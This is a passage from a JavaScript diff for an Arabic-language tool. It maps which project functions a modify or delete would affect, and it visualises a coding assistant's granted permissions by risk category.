أسراراً"],"sentence":"سمحت بـ 17 صلاحية دائمة (10 منها خطر). من هلق وطالع، Claude بيقدر يمسح ملفات، يرسل أو ينشر على الإنترنت، يوصل لملفات برا المشروع، يشغّل أي كود، يقرأ أو يغيّر أسراراً بدون ما يسألك. وضع «قبول التعديلات»: تعديل الملفات بيمر بدون سؤال."},"demo":true};
+  var PROJECT = {"name":"glitchrun","stats":{"files":2,"functions":112,"edges":267,"areas":7,"parts":16},"warnings":["الخريطة تقدير مبني على قراءة الكود، مو ضمان"]};
+  var LSKEY = "impact:" + PROJECT.name + ":names";
+  function loadNames() { try { return JSON.parse(localStorage.getItem(LSKEY) || "{}") || {}; } catch (e) { return {}; } }
+  function saveNames(n) { try { localStorage.setItem(LSKEY, JSON.stringify(n)); } catch (e) {} }
+  var NM = loadNames();
+  document.title = "خريطة الأثر · " + PROJECT.name;
+  $("projName").textContent = "خريطة " + PROJECT.name;
+  $("intro").textContent = "هاي خريطة مشروعك، طالعة من الكود نفسه (" + PROJECT.stats.files + " ملف، " + PROJECT.stats.functions + " دالة). اضغط على أي جزء، واختر «تعديل» أو «حذف»، وشوف شو رح يتأثر قبل ما تلمس شي. الأسماء تلقائية: لو بدك اسماً أوضح اضغط «غيّر الاسم».";
+  if (PROJECT.warnings && PROJECT.warnings.length) { var lim = $("limits"); lim.hidden = false; lim.textContent = PROJECT.warnings.join(" · "); }
+
+  // ---- graph lookups ---------------------------------------------------------------------
+  var NODE = {}, KIDS = {}, DEPS = {};
+  G.nodes.forEach(function (n) { NODE[n.id] = n; if (n.parent) (KIDS[n.parent] = KIDS[n.parent] || []).push(n.id); });
+  G.edges.forEach(function (e) { (DEPS[e.to] = DEPS[e.to] || []).push(e); });
+  function descendants(id) { var out = []; (KIDS[id] || []).forEach(function (c) { out.push(c); out = out.concat(descendants(c)); }); return out; }
+  function label(id) {
+    var n = NODE[id];
+    if (n.kind === "route") return "طلب " + n.name;
+    if (n.kind === "top") return "الكود الرئيسي لملف " + n.file.split("/").pop();
+    if (n.kind === "data") return "بيانات " + n.name;
+    return n.name;
+  }
+  function where(id) { var n = NODE[id]; return n.kind === "route" || n.kind === "top" ? n.file : n.file + ":" + n.start; }
+  var HOW = { calls: "يستدعي", passes: "يمرّر", uses: "يقرأ", network: "يرسل طلباً إلى" };
+
+  // ---- display nodes (areas and leaves) -------------------------------------------------------
+  var DISP = {}, order = [];
+  AREAS.forEach(function (a) {
+    var an = { id: a.id, name: NM[a.id] || a.name, desc: a.desc, kind: "area", members: [], leaves: [] };
+    DISP[a.id] = an; order.push(an);
+    a.leaves.forEach(function (l) {
+      var ln = { id: l.id, name: NM[l.id] || l.name, desc: l.desc || a.desc, kind: "leaf", members: l.members, area: a.id };
+      DISP[l.id] = ln; an.leaves.push(ln); order.push(ln);
+    });
+    if (!a.leaves.length) an.members = a.members; else an.members = [].concat.apply([], a.leaves.map(function (l) { return l.members; }));
+  });
+  var HOME = {};   // node id -> the display node that shows it
+  order.forEach(function (d) { if (d.kind === "leaf" || (d.kind === "area" && !d.leaves.length)) d.members.forEach(function (m) { HOME[m] = d.id; }); });
+
+  // ---- layout -----------------------------------------------------------------------------------
+  var pos = {};
+  (function () {
+    var tree = { center: { id: "core" }, groups: AREAS.map(function (a) { return { node: { id: a.id }, kids: a.leaves.map(function (l) { return { id: l.id }; }) }; }) };
+    var L = layoutTree(tree), minX = 1e9, maxX = -1e9, minY = 1e9, maxY = -1e9;
+    L.N.forEach(function (n) { pos[n.id] = { x: n.x, y: n.y, w: n.w, h: n.h }; minX = Math.min(minX, n.x - n.w / 2); maxX = Math.max(maxX, n.x + n.w / 2); minY = Math.min(minY, n.y - n.h / 2); maxY = Math.max(maxY, n.y + n.h / 2); });
+    $("map").setAttribute("viewBox", (minX - 12) + " " + (minY - 12) + " " + (maxX - minX + 24) + " " + (maxY - minY + 24));
+  })();
+
+  function el(tag, attrs, parent) { var e = document.createElementNS(NS, tag); for (var k in attrs) e.setAttribute(k, attrs[k]); if (parent) parent.appendChild(e); return e; }
+  function edgePt(p, tx, ty) {
+    var dx = tx - p.x, dy = ty - p.y, t = Math.min((p.w / 2) / Math.max(Math.abs(dx), 1e-6), (p.h / 2) / Math.max(Math.abs(dy), 1e-6));
+    return [p.x + dx * t, p.y + dy * t];
+  }
+  function curve(a, b, bend) {
+    var p1 = edgePt(pos[a], pos[b].x, pos[b].y), p2 = edgePt(pos[b], pos[a].x, pos[a].y);
+    var mx = (p1[0] + p2[0]) / 2, my = (p1[1] + p2[1]) / 2, dx = p2[0] - p1[0], dy = p2[1] - p1[1], len = Math.sqrt(dx * dx + dy * dy) || 1;
+    return "M" + p1[0].toFixed(1) + "," + p1[1].toFixed(1) + " Q" + (mx - dy / len * bend).toFixed(1) + "," + (my + dx / len * bend).toFixed(1) + " " + p2[0].toFixed(1) + "," + p2[1].toFixed(1);
+  }
+
+  var state = { sel: order[0].id, mode: "modify" };
+  (function () { var best = -1; order.forEach(function (d) { if (d.kind === "area" && d.leaves.length) return; var c = 0; d.members.forEach(function (m) { c += (DEPS[m] || []).length; }); if (c > best) { best = c; state.sel = d.id; } }); })();
+
+  var nodeEls = {};
+  (function build() {
+    var tl = $("treeLayer"), nl = $("nodeLayer");
+    AREAS.forEach(function (a, i) {
+      el("path", { "class": "tree-edge", d: curve("core", a.id, i % 2 ? 8 : -8) }, tl);
+      a.leaves.forEach(function (l, j) { el("path", { "class": "tree-edge", d: curve(a.id, l.id, j % 2 ? 6 : -6) }, tl); });
+    });
+    function mk(id, cls, name) {
+      var p = pos[id];
+      var g = el("g", { "class": "node " + cls, tabindex: "0", role: "button", "data-id": id }, nl);
+      el("rect", { "class": "ring", x: p.x - p.w / 2 - 4, y: p.y - p.h / 2 - 4, width: p.w + 8, height: p.h + 8, rx: 13 }, g);
+      el("rect", { "class": "box", x: p.x - p.w / 2, y: p.y - p.h / 2, width: p.w, height: p.h, rx: 10 }, g);
+      var t = el("text", { "class": "t", x: p.x, y: p.y - 4, "text-anchor": "middle", "dominant-baseline": "central" }, g); t.textContent = name;
+      var s = el("text", { "class": "sub", x: p.x, y: p.y + 11, "text-anchor": "middle", "dominant-baseline": "central" }, g);
+      var b = el("g", { "class": "badge", visibility: "hidden" }, g);
+      el("circle", { cx: p.x + p.w / 2 - 3, cy: p.y - p.h / 2 + 3, r: 9 }, b);
+      var bt = el("text", { x: p.x + p.w / 2 - 3, y: p.y - p.h / 2 + 3 }, b);
+      nodeEls[id] = { g: g, t: t, s: s, badge: b, bt: bt };
+      g.addEventListener("click", function () { choose(id, true); });
+      g.addEventListener("keydown", function (e) { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); choose(id, true); } });
+    }
+    mk("core", "core", PROJECT.name);
+    order.forEach(function (d) { mk(d.id, d.kind, d.name); });
+    fit();
+  })();
+  function fit() {
+    Object.keys(nodeEls).forEach(function (id) {
+      var t = nodeEls[id].t, base = id === "core" ? 14 : (DISP[id] && DISP[id].kind === "area" ? 12.5 : 11.5), w = 0;
+      t.setAttribute("font-size", base);
+      try { w = t.getComputedTextLength(); } catch (e) {}
+      if (w > pos[id].w - 12) t.setAttribute("font-size", (base * (pos[id].w - 12) / w).toFixed(2));
+    });
+  }
+
+  // ---- impact -----------------------------------------------------------------------------------
+  function targetsOf(id) { return DISP[id].members; }
+  function analyze(targets, mode) {
+    var removed = {}, info = {}, queue = [];
+    targets.forEach(function (t) { removed[t] = true; if (mode === "delete") descendants(t).forEach(function (d) { removed[d] = true; }); });
+    Object.keys(removed).forEach(function (r) { queue.push({ id: r, d: 0 }); });
+    while (queue.length) {
+      var cur = queue.shift();
+      (DEPS[cur.id] || []).forEach(function (e) {
+        if (!removed[e.from] && !info[e.from]) { info[e.from] = { d: cur.d + 1, via: cur.id, how: e.how }; queue.push({ id: e.from, d: cur.d + 1 }); }
+      });
+    }
+    return { removed: removed, info: info };
+  }
+  var RANK = { removed: 5, target: 5, direct: 3, indirect: 2, safe: 1 };
+  function memberState(id, res) {
+    if (res.removed[id]) return state.mode === "delete" ? "removed" : "target";
+    if (res.info[id]) return res.info[id].d === 1 ? "direct" : "indirect";
+    return "safe";
+  }
+  var TARGETSET = {};
+  function isTarget(id) { return !!TARGETSET[id]; }
+  function groupState(d, res) {
+    var worst = "safe", hit = 0;
+    d.members.forEach(function (m) { var s = memberState(m, res); if (s !== "safe") hit++; if (RANK[s] > RANK[worst]) worst = s; });
+    if (d.kind === "area" && d.leaves.length) {
+      worst = "safe"; hit = 0;
+      d.leaves.forEach(function (l) { var r = groupState(l, res); hit += r.hit; if (RANK[r.state] > RANK[worst]) worst = r.state; });
+    }
+    return { state: worst, hit: hit, total: d.members.length };
+  }
+
+  var BADGE = { removed: ["✕", "b-removed"], target: ["✎", "b-target"], direct: ["!", "b-direct"], indirect: ["~", "b-indirect"], safe: ["✓", "b-safe"] };
+  var STATUS = { target: "ستعدّله", removed: "سيُحذف", direct: "يتأثر مباشرة", indirect: "قد يتأثر", safe: "سليم" };
+
+  function paint(res) {
+    var fl = $("flowLayer"); while (fl.firstChild) fl.removeChild(fl.firstChild);
+    order.forEach(function (d) {
+      var gs = groupState(d, res), ne = nodeEls[d.id];
+      ne.g.setAttribute("class", "node " + d.kind + " st-" + gs.state + (d.id === state.sel ? " sel" : ""));
+      ne.g.setAttribute("aria-pressed", d.id === state.sel ? "true" : "false");
+      ne.g.setAttribute("aria-label", d.name + ": " + STATUS[gs.state] + (gs.hit ? " (" + gs.hit + " من " + gs.total + " دالة)" : ""));
+      ne.s.textContent = gs.hit ? gs.hit + " من " + gs.total : gs.total + " دالة";
+      var bd = BADGE[gs.state]; ne.badge.setAttribute("class", "badge " + bd[1]); ne.badge.setAttribute("visibility", "visible"); ne.bt.textContent = bd[0];
+    });
+    nodeEls.core.g.setAttribute("class", "node core");
+    var seen = {}, count = 0;
+    Object.keys(res.info).forEach(function (id) {
+      var inf = res.info[id], a = HOME[inf.via], b = HOME[id];
+      if (!a || !b || a === b || !pos[a] || !pos[b]) return;
+      var k = a + ">" + b; if (seen[k] || count > 14) return; seen[k] = 1; count++;
+      el("path", { "class": "flow-edge", d: curve(a, b, 24 * (count % 2 ? 1 : -1)), "marker-end": "url(#arrowhead)" }, fl);
+    });
+  }
+
+  // ---- panel ----------------------------------------------------------------------------------
+  function chip(cls, text) { var s = document.createElement("span"); s.className = "chip " + cls; s.textContent = text; return s; }
+  var UNITS = order.filter(function (g) { return g.kind === "leaf" || (g.kind === "area" && !g.leaves.length); });
+  function unitName(u) { return u.kind === "leaf" ? u.name + " · " + DISP[u.area].name : u.name; }
+  function names(arr) { return arr.map(function (u) { return "«" + unitName(u) + "»"; }).join("، "); }
+  function fnText(id) { var n = NODE[id]; return n.kind === "function" ? n.name + "()" : label(id); }
+  function because(u, res) {
+    var via = {};
+    u.members.forEach(function (m) { var inf = res.info[m]; if (inf) { var h = HOME[inf.via]; if (h && h !== u.id) via[h] = 1; } });
+    var list = Object.keys(via).map(function (id) { return "«" + unitName(DISP[id]) + "»"; });
+    return list.length ? "لأنه بيعتمد على " + list.slice(0, 2).join(" و") + (list.length > 2 ? " وغيرها" : "") : "";
+  }
+  function unitBlock(cls, title, units, res) {
+    if (!units.length) return null;
+    var d = document.createElement("div"); d.className = "group g-" + cls;
+    var h = document.createElement("h3"); h.textContent = title + " (" + units.length + ")"; d.appendChild(h);
+    var ul = document.createElement("ul");
+    units.forEach(function (u) {
+      var gs = groupState(u, res), li = document.createElement("li"), b = document.createElement("b"), s1 = document.createElement("span"), s2 = document.createElement("span");
+      li.className = "unit"; b.textContent = unitName(u); s1.textContent = u.desc;
+      var why = because(u, res);
+      s2.textContent = gs.hit + " من " + gs.total + " دالة" + (why ? " · " + why : "");
+      li.appendChild(b); li.appendChild(s1); li.appendChild(s2); ul.appendChild(li);
+    });
+    d.appendChild(ul); return d;
+  }
+  function fnBlock(title, ids, res) {
+    if (!ids.length) return null;
+    var d = document.createElement("div"); d.className = "group";
+    var h = document.createElement("h3"); h.textContent = title + " (" + ids.length + ")"; d.appendChild(h);
+    var ul = document.createElement("ul");
+    ids.slice(0, 40).forEach(function (id) {
+      var li = document.createElement("li"), b = document.createElement("b"), w = document.createElement("span");
+      b.className = "fn"; b.textContent = fnText(id) + " "; w.className = "ltr"; w.textContent = where(id); b.appendChild(w); li.appendChild(b);
+      var inf = res.info[id]; if (inf) { var sp = document.createElement("span"); sp.textContent = HOW[inf.how] + " «" + label(inf.via) + "»"; li.appendChild(sp); }
+      ul.appendChild(li);
+    });
+    if (ids.length > 40) { var more = document.createElement("li"), sp2 = document.createElement("span"); sp2.textContent = "و" + (ids.length - 40) + " دالة أخرى."; more.appendChild(sp2); ul.appendChild(more); }
+    d.appendChild(ul); return d;
+  }
+
+  function render() {
+    var d = DISP[state.sel]; TARGETSET = {}; targetsOf(state.sel).forEach(function (t) { TARGETSET[t] = true; });
+    var res = analyze(targetsOf(state.sel), state.mode);
+    paint(res);
+    var files = {}; d.members.forEach(function (m) { files[NODE[m].file] = 1; });
+    $("selName").textContent = d.name + (d.kind === "leaf" ? " · " + DISP[d.area].name : "");
+    $("selDesc").textContent = d.desc;
+    $("selWhere").textContent = d.members.length + " من الدوال والأجزاء، في " + Object.keys(files).join(" و");
+    $("mModify").setAttribute("aria-pressed", state.mode === "modify"); $("mDelete").setAttribute("aria-pressed", state.mode === "delete");
+
+    var U = { removed: [], direct: [], indirect: [], safe: [] };
+    UNITS.forEach(function (u) {
+      var s = groupState(u, res).state;
+      if (s === "removed" || s === "target") U.removed.push(u); else if (s === "direct") U.direct.push(u); else if (s === "indirect") U.indirect.push(u); else U.safe.push(u);
+    });
+    var picked = UNITS.filter(function (u) { return u.members.some(function (m) { return TARGETSET[m]; }); });
+    var alsoGone = U.removed.filter(function (u) { return picked.indexOf(u) < 0; });
+    var nm = "«" + d.name + "»", t;
+    if (state.mode === "delete") {
+      t = "لو حذفت " + nm + ": " + (U.direct.length ? "رح يتعطّل أو يتغيّر شي بـ " + names(U.direct) + "." : "ما رح يتعطّل شي بشكل مباشر.");
+      if (alsoGone.length) t += " ورح ينحذف معه كمان " + names(alsoGone) + ".";
+      if (U.indirect.length) t += " وممكن يتأثر بشكل غير مباشر: " + names(U.indirect) + ".";
+    } else {
+      t = "لو عدّلت " + nm + ": " + (U.direct.length ? "لازم تتأكد بعد التعديل من " + names(U.direct) + "." : "ما في جزء بيعتمد عليه مباشرة.");
+      if (U.indirect.length) t += " وممكن يمتد الأثر لـ " + names(U.indirect) + ".";
+    }
+    if (!U.direct.length && !U.indirect.length && !alsoGone.length) t += " لا شي تاني بيعتمد عليه بحسب الخريطة.";
+    $("summary").textContent = t;
+
+    var chips = $("chips"); chips.textContent = "";
+    chips.appendChild(chip(state.mode === "delete" ? "removed" : "target", (state.mode === "delete" ? "ينحذف " : "تعدّل ") + U.removed.length + " جزء"));
+    chips.appendChild(chip("direct", "يتأثر مباشرة " + U.direct.length));
+    chips.appendChild(chip("indirect", "ممكن يتأثر " + U.indirect.length));
+    chips.appendChild(chip("safe", "سليم " + U.safe.length));
+
+    var gs = $("groups"); gs.textContent = "";
+    [state.mode === "delete" && alsoGone.length ? unitBlock("removed", "ينحذف معه", alsoGone, res) : null,
+     unitBlock("direct", state.mode === "delete" ? "رح يتعطّل أو يتغيّر" : "لازم تتأكد منه", U.direct, res),
+     unitBlock("indirect", "ممكن يتأثر", U.indirect, res)].forEach(function (b) { if (b) gs.appendChild(b); });
+    if (U.safe.length) { var sl = document.createElement("p"); sl.className = "safe-line"; sl.textContent = "أجزاء ما رح تتأثر: " + U.safe.map(unitName).join("، ") + "."; gs.appendChild(sl); }
+
+    var all = Object.keys(NODE), direct = [], indirect = [], gone = [];
+    all.forEach(function (id) {
+      if (res.removed[id]) { if (!TARGETSET[id]) gone.push(id); return; }
+      if (res.info[id]) (res.info[id].d === 1 ? direct : indirect).push(id);
+    });
+    var det = document.createElement("details"), sm = document.createElement("summary");
+    sm.textContent = "التفاصيل التقنية: أسماء الدوال وأرقام السطور"; det.appendChild(sm);
+    [state.mode === "delete" ? fnBlock("دوال تنحذف معه", gone, res) : null, fnBlock("دوال تتأثر مباشرة", direct, res), fnBlock("دوال قد تتأثر", indirect, res)].forEach(function (b) { if (b) { det.appendChild(b); det.appendChild(document.createElement("br")); } });
+    gs.appendChild(det);
+  }
+
+  function choose(id, scroll) {
+    if (id === "core") return;
+    if (id !== state.sel) state.sel = id;
+    render();
+    if (scroll) { var r = $("panel").getBoundingClientRect(); if (r.top > window.innerHeight * 0.75 || r.bottom < 0) { try { $("panel").scrollIntoView({ behavior: "smooth", block: "start" }); } catch (e) {} } }
+  }
+  $("mModify").addEventListener("click", function () { state.mode = "modify"; render(); });
+  $("mDelete").addEventListener("click", function () { state.mode = "delete"; render(); });
+
+  // ---- permissions mode: its own map (centre -> permissions -> what branches from each) ------------
+  var HACK = false, MAP_INTRO = $("intro").textContent;
+  var PM = $("permMap"), PV = { view: "top", rule: null, sel: null };
+  var UNITS = order.filter(function (g) { return g.kind === "leaf" || (g.kind === "area" && !g.leaves.length); });
+  function unitCaps(u) { var c = {}; u.members.forEach(function (m) { (NODE[m].caps || []).forEach(function (k) { (c[k] = c[k] || []).push(m); }); }); return c; }
+  function unitName(u) { return u.kind === "leaf" ? u.name + " · " + DISP[u.area].name : u.name; }
+  var CAPLBL = { delete: "يمسح ملفات", send: "يرسل للإنترنت", install: "يثبّت برامج", code: "يشغّل أي كود", secrets: "يقرأ الأسرار", outside: "برا المشروع", modify: "يعدّل ملفات" };
+  var CAPSTATE = { delete: "danger", send: "danger", install: "danger", code: "danger", secrets: "danger", outside: "watch", modify: "watch" };
+  var CAPEXPL = { delete: "يقدر يمسح ملفات بدون تراجع.", send: "يقدر يرسل بيانات للإنترنت أو ينشر.", install: "يقدر ينزّل ويثبّت برامج وحزماً على جهازك.", code: "يقدر يشغّل أي كود، فكل شي ممكن.", secrets: "يقدر يقرأ ملفات سرية: مفاتيح وكلمات سر.", outside: "يقدر يوصل لملفات برا مجلد المشروع.", modify: "يقدر يعدّل الملفات بدون ما يسألك." };
+  var CATS = [
+    { id: "files", name: "الملفات", tools: ["Read", "Edit", "Write", "MultiEdit", "NotebookEdit", "Glob", "Grep", "LS", "additionalDirectories"] },
+    { id: "cmd", name: "الأوامر", tools: ["Bash"] },
+    { id: "net", name: "الإنترنت", tools: ["WebFetch", "WebSearch"] },
+    { id: "apps", name: "تطبيقات خارجية", tools: ["mcp"] },
+    { id: "agents", name: "وكلاء ومهارات", tools: ["Task", "Agent", "Skill", "TodoWrite"] },
+    { id: "mode", name: "الوضع العام", tools: ["mode"] },
+    { id: "deny", name: "الحمايات", tools: [] }
+  ];
+  var SRC = { user: "كل مشاريعك", project: "هالمشروع (مشترك)", local: "هالمشروع (عندك بس)" };
+  var RISKS = { red: 2, yellow: 1, green: 0 };
+  function parseRaw(raw) { var m = /^([A-Za-z_][\w-]*(?:__[\w.-]+)*)(?:\(([\s\S]*)\))?$/.exec(raw); return { tool: m ? m[1] : raw, spec: m ? m[2] : undefined }; }
+  function toolOfRule(r) { if (r.isMode) return "mode"; if (r.raw.indexOf("additionalDirectories") === 0) return "additionalDirectories"; var t = parseRaw(r.raw).tool; return t.indexOf("mcp__") === 0 ? "mcp" : t; }
+  function catOf(r) { if (r.kind === "deny") return "deny"; if (/^(enableAllProjectMcpServers|mcp server:)/.test(r.raw)) return "apps"; var t = toolOfRule(r); for (var i = 0; i < CATS.length; i++) if (CATS[i].tools.indexOf(t) >= 0) return CATS[i].id; return "agents"; }
+  function shortOf(r) {
+    if (r.isMode) return "وضع " + r.raw.replace("mode: ", "");
+    if (r.raw.indexOf("enableAllProjectMcpServers") === 0) return "كل خوادم المشروع";
+    if (r.raw.indexOf("mcp server:") === 0) return r.raw.split(": ")[1];
+    if (r.raw.indexOf("additionalDirectories") === 0) return "مجلد " + r.raw.split(": ")[1];
+    var q = parseRaw(r.raw), t = q.tool, sp = q.spec;
+    if (r.kind === "deny") return "ممنوع " + (sp || t);
+    if (t === "Bash") { if (sp === undefined || sp === "*") return "أي أمر"; var pre = sp.replace(/(:\*|\s?\*)$/, ""); return pre; }
+    if (["Edit", "Write", "MultiEdit", "NotebookEdit"].indexOf(t) >= 0) return "تعديل" + (sp ? " " + sp : "");
+    if (t === "Read") return "قراءة" + (sp ? " " + sp : "");
+    if (t === "WebFetch") return sp ? sp.replace(/^domain:/, "") : "أي موقع";
+    if (t === "WebSearch") return "بحث";
+    if (t.indexOf("mcp__") === 0) { var p = t.split("__"); return p[2] ? p[1] + "/" + p[2] : p[1]; }
+    return t;
+  }
+  function stOf(risk) { return risk === "red" ? "danger" : risk === "yellow" ? "watch" : "ok"; }
+  function worstSt(list) { var w = "ok"; list.forEach(function (s) { if (s === "danger" || (s === "watch" && w === "ok")) w = s; }); return w; }
+  function capsOfRule(r) {
+    var t = toolOfRule(r), c = (r.tags || []).filter(function (x, i, a) { return a.indexOf(x) === i && CAPLBL[x]; });
+    if (["Edit", "Write", "MultiEdit", "NotebookEdit"].indexOf(t) >= 0 && c.indexOf("modify") < 0) c.unshift("modify");
+    if (r.isMode && r.raw === "mode: acceptEdits" && c.indexOf("modify") < 0) c.push("modify");
+    return r.kind === "deny" ? [] : c;
+  }
+  function allRules() {
+    var rs = APPR ? APPR.rules.slice() : [];
+    if (APPR && APPR.mode && APPR.mode.risk !== "green") rs.push({ isMode: true, raw: "mode: " + APPR.mode.value, kind: "allow", risk: APPR.mode.risk, plain: APPR.mode.text, worst: APPR.mode.text, tags: APPR.mode.value === "bypassPermissions" ? ["delete", "send", "install", "code"] : [], scopeText: SRC[APPR.mode.source] || "" });
+    return rs;
+  }
+  function topTree() {
+    var rs = allRules(), groups = [];
+    rs.forEach(function (r, i) { r._i = i; });
+    CATS.forEach(function (c) {
+      var mine = rs.filter(function (r) { return catOf(r) === c.id; }).sort(function (a, b) { return RISKS[b.risk] - RISKS[a.risk]; });
+      if (!mine.length) return;
+      var shown = mine.length > 3 ? mine.slice(0, 2) : mine, hidden = mine.length > 3 ? mine.slice(2) : [];
+      var kids = shown.map(function (r) { var cp = capsOfRule(r); return { id: "r" + r._i, kind: "rule", rule: r, label: shortOf(r), sub: r.kind === "deny" ? "ممنوع" : (cp[0] ? CAPLBL[cp[0]] : (r.risk === "red" ? "خطر" : r.risk === "yellow" ? "بحذر" : "آمن")), state: r.kind === "deny" ? "ok" : stOf(r.risk) }; });
+      if (hidden.length) kids.push({ id: "more:" + c.id, kind: "more", rules: hidden, label: "+" + hidden.length + " أخرى", sub: "", state: worstSt(hidden.map(function (r) { return stOf(r.risk); })) });
+      groups.push({ node: { id: "cat:" + c.id, kind: "cat", cat: c, rules: mine, label: c.name, sub: mine.length + " صلاحية", state: c.id === "deny" ? "ok" : worstSt(mine.map(function (r) { return stOf(r.risk); })) }, kids: kids });
+    });
+    return { center: { id: "c", kind: "center", label: "صلاحيات Claude", sub: rs.filter(function (r) { return r.kind === "allow"; }).length + " دائمة" }, groups: groups };
+  }
+  function affectedKids(cap) {
+    function withCaps(keys) { return UNITS.filter(function (u) { var c = unitCaps(u); return keys.some(function (k) { return c[k]; }); }); }
+    var list;
+    if (cap === "modify" || cap === "delete" || cap === "code") return [{ id: "all:" + cap, kind: "all", label: "كل أجزاء المشروع", sub: UNITS.length + " جزء", state: cap === "modify" ? "watch" : "danger" }];
+    if (cap === "install") return [{ id: "ext:install", kind: "ext", label: "برامج جهازك", sub: "", state: "danger" }];
+    if (cap === "outside") return [{ id: "ext:outside", kind: "ext", label: "ملفاتك برا المشروع", sub: "", state: "watch" }];
+    list = cap === "send" ? withCaps(["NET", "AI", "SRV"]) : withCaps(["KEY", "STO", "DB"]);
+    var kids = list.slice(0, 3).map(function (u) { var c = unitCaps(u); return { id: "u:" + cap + ":" + u.id, kind: "unit", unit: u, label: u.name, sub: Object.keys(c).join(" "), state: (c.KEY || c.AI || c.DB) ? "danger" : "watch" }; });
+    if (list.length > 3) kids.push({ id: "umore:" + cap, kind: "umore", units: list.slice(3), label: "+" + (list.length - 3) + " أجزاء", sub: "", state: "watch" });
+    if (!kids.length) kids.push({ id: "none:" + cap, kind: "ext", label: "ما لقيت جزء متأثر", sub: "", state: "ok" });
+    return kids;
+  }
+  function ruleTree(r) {
+    var caps = capsOfRule(r), groups = [];
+    caps.forEach(function (cap) { groups.push({ node: { id: "cap:" + cap, kind: "cap", cap: cap, label: CAPLBL[cap], sub: "", state: CAPSTATE[cap] }, kids: affectedKids(cap) }); });
+    if (!groups.length) groups.push({ node: { id: "cap:none", kind: "cap", cap: "none", label: r.kind === "deny" ? "محمي" : "ما فيه أثر خطر", sub: "", state: "ok" }, kids: [] });
+    return { center: { id: "c", kind: "center", label: shortOf(r), sub: r.kind === "deny" ? "ممنوع" : "صلاحية دائمة", state: stOf(r.risk) }, groups: groups };
+  }
+
+  // layout: ellipses for the first and second ring, then push overlapping boxes apart
+  function layoutTree(tree) {
+    var N = [], E = [], c = tree.center; c.x = 0; c.y = 0; c.w = 104; c.h = 46; c.fixed = true; N.push(c);
+    var n = tree.groups.length;
+    tree.groups.forEach(function (g, i) {
+      var a = (n === 1 ? -90 : -90 + i * 360 / n) * Math.PI / 180, o = g.node;
+      o.x = 112 * Math.cos(a); o.y = 175 * Math.sin(a); o.w = 100; o.h = 42; N.push(o); E.push([c, o]);
+      var m = g.kids.length, spread = Math.min(30, 80 / n);
+      g.kids.forEach(function (k, j) {
+        var t = a + (m === 1 ? 0 : -spread + 2 * spread * j / (m - 1)) * Math.PI / 180;
+        k.x = 215 * Math.cos(t); k.y = 310 * Math.sin(t); k.w = 96; k.h = 40; N.push(k); E.push([o, k]);
+      });
+    });
+    for (var it = 0; it < 120; it++) {
+      var moved = false;
+      for (var i = 0; i < N.length; i++) for (var j = i + 1; j < N.length; j++) {
+        var A = N[i], B = N[j], dx = B.x - A.x, dy = B.y - A.y, ox = (A.w + B.w) / 2 + 6 - Math.abs(dx), oy = (A.h + B.h) / 2 + 6 - Math.abs(dy);
+        if (ox > 0 && oy > 0) {
+          moved = true;
+          var fa = A.fixed ? 0 : (B.fixed ? 1 : 0.5), fb = B.fixed ? 0 : (A.fixed ? 1 : 0.5);
+          if (ox < oy) { var sx = dx >= 0 ? 1 : -1; A.x -= sx * ox * fa; B.x += sx * ox * fb; }
+          else { var sy = dy >= 0 ? 1 : -1; A.y -= sy * oy * fa; B.y += sy * oy * fb; }
+        }
+      }
+      if (!moved) break;
+    }
+    return { N: N, E: E };
+  }
+  function pfit(t, maxw, base) {
+    t.style.fontSize = ""; t.setAttribute("font-size", base); var w = 0; try { w = t.getComputedTextLength(); } catch (e) {}
+    if (w > maxw) t.setAttribute("font-size", Math.max(6, base * maxw / w).toFixed(2));
+  }
+  function pcurve(a, b) {
+    function pt(n, tx, ty) { var dx = tx - n.x, dy = ty - n.y, k = Math.min((n.w / 2) / Math.max(Math.abs(dx), 1e-6), (n.h / 2) / Math.max(Math.abs(dy), 1e-6)); return [n.x + dx * k, n.y + dy * k]; }
+    var p1 = pt(a, b.x, b.y), p2 = pt(b, a.x, a.y), mx = (p1[0] + p2[0]) / 2, my = (p1[1] + p2[1]) / 2, dx = p2[0] - p1[0], dy = p2[1] - p1[1], len = Math.sqrt(dx * dx + dy * dy) || 1;
+    return "M" + p1[0].toFixed(1) + "," + p1[1].toFixed(1) + " Q" + (mx - dy / len * 8).toFixed(1) + "," + (my + dx / len * 8).toFixed(1) + " " + p2[0].toFixed(1) + "," + p2[1].toFixed(1);
+  }
+  function currentTree() { return PV.view === "rule" ? ruleTree(PV.rule) : topTree(); }
+  function drawPerm() {
+    var tree = currentTree(), L = layoutTree(tree);
+    while (PM.firstChild) PM.removeChild(PM.firstChild);
+    var gE = el("g", {}, PM), gN = el("g", {}, PM), minX = 1e9, maxX = -1e9, minY = 1e9, maxY = -1e9;
+    L.E.forEach(function (e) { el("path", { "class": "tree-edge", d: pcurve(e[0], e[1]) }, gE); });
+    L.N.forEach(function (n) {
+      minX = Math.min(minX, n.x - n.w / 2); maxX = Math.max(maxX, n.x + n.w / 2); minY = Math.min(minY, n.y - n.h / 2); maxY = Math.max(maxY, n.y + n.h / 2);
+      var cls = n.kind === "center" ? "node core" + (PV.view === "rule" ? " pm-" + (n.state || "ok") : "") : "node pm-" + n.state;
+      var g = el("g", { "class": cls + (PV.sel === n.id ? " sel" : ""), tabindex: "0", role: "button", "aria-label": n.label + (n.sub ? ": " + n.sub : "") }, gN);
+      el("rect", { "class": "ring", x: n.x - n.w / 2 - 4, y: n.y - n.h / 2 - 4, width: n.w + 8, height: n.h + 8, rx: 13 }, g);
+      el("rect", { "class": "box", x: n.x - n.w / 2, y: n.y - n.h / 2, width: n.w, height: n.h, rx: 10 }, g);
+      var t = el("text", { "class": "t", x: n.x, y: n.y - (n.sub ? 4 : 0), "text-anchor": "middle", "dominant-baseline": "central" }, g); t.textContent = n.label;
+      if (n.sub) { var s2 = el("text", { "class": "sub", x: n.x, y: n.y + 11, "text-anchor": "middle", "dominant-baseline": "central" }, g); s2.textContent = n.sub; pfit(s2, n.w - 10, 9); s2.style.fontSize = s2.getAttribute("font-size") + "px"; }
+      pfit(t, n.w - 10, n.kind === "center" ? 14 : n.kind === "cat" ? 12.5 : 11.5);
+      function go() { onPermNode(n); }
+      g.addEventListener("click", go);
+      g.addEventListener("keydown", function (e) { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); go(); } });
+    });
+    PM.setAttribute("viewBox", (minX - 12) + " " + (minY - 12) + " " + (maxX - minX + 24) + " " + (maxY - minY + 24));
+    PM._nodes = L.N;
+  }
+  function onPermNode(n) {
